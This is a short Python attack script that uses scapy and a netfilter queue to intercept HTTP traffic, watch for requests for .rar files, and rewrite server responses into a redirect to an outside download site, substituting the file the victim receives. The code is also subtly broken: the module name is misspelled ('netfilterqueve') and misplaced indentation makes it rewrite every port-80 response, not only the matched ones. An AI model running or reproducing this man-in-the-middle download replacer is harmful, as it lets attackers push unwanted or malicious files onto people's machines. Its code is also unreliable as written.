#!/usr/bin/python

import  netfilterqueve
import scapy.all as scapy
ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport ==80:
            if ".rar " in  scapy_packet[scapy.Raw].load.decode():
                print("[+] rar Request")
            ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport ==80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
            print("[+] Replacing file ")
            madified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://kmsauto.su/index.php?do=download&id=31\n\n" )

            packet.set_payload(bytes(madified_packet))



    packet.accept()


queve = netfilterqueve.NetfilterQueve()
queve.bind(0, process_packet)
queve.run()
